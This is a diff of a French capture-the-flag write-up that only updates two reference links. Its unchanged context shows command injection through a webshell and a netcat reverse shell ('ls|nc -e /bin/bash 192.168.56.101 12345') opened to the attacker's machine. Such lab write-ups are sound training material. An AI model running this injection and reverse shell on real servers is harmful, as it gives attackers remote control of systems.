@@ -79,7 +79,7 @@ does something as stupid as this. We will have a meeting about this and other st
 
 ## À l'assaut du webshell
 
-Hmmmm hmmmmm, voilà qui est délicieux : un _webshell_ est installé sur le serveur Web. Il s'agit d'un script permettant d'interagir avec le serveur et de lui envoyer des commandes. Il y avait déjà un _webshell_ dans l'un des CTF résolus sur ce dépôt, à savoir [bulldog1](/CTF-VulnLabs/bulldog1). Il était alors possible [d'injecter des commandes](https://www.owasp.org/index.php/Command_Injection) avant d'exfiltrer des données et de se connecter au serveur. Après quelques essais, voici les données qui ont pu être exfiltrées malgré cette protection. 
+Hmmmm hmmmmm, voilà qui est délicieux : un _webshell_ est installé sur le serveur Web. Il s'agit d'un script permettant d'interagir avec le serveur et de lui envoyer des commandes. Il y avait déjà un _webshell_ dans l'un des CTF résolus sur ce dépôt, à savoir [bulldog1](/CTF-VulnLabs/bulldog1). Il était alors possible [d'injecter des commandes](https://owasp.org/www-community/attacks/Command_Injection) avant d'exfiltrer des données et de se connecter au serveur. Après quelques essais, voici les données qui ont pu être exfiltrées malgré cette protection. 
 
 ```console
 Command : ls
@@ -127,7 +127,7 @@ Le but du jeu consiste à exécuter des commandes auxquelles nous n'avons normal
 
 ## Mise en place d'un reverse shell et accès au serveur Bob
 
-Le [_reverse shell_](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/) avec [__netcat__](http://nc110.sourceforge.net/) a particulièrement bien fonctionné la première fois.
+Le [_reverse shell_](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/) avec [__netcat__](https://nc110.sourceforge.io/) a particulièrement bien fonctionné la première fois.
 
 ```nc -lvp 12345``` sur notre machine, ```ls|nc -e /bin/bash 192.168.56.101 12345``` dans le _webshell_.
 
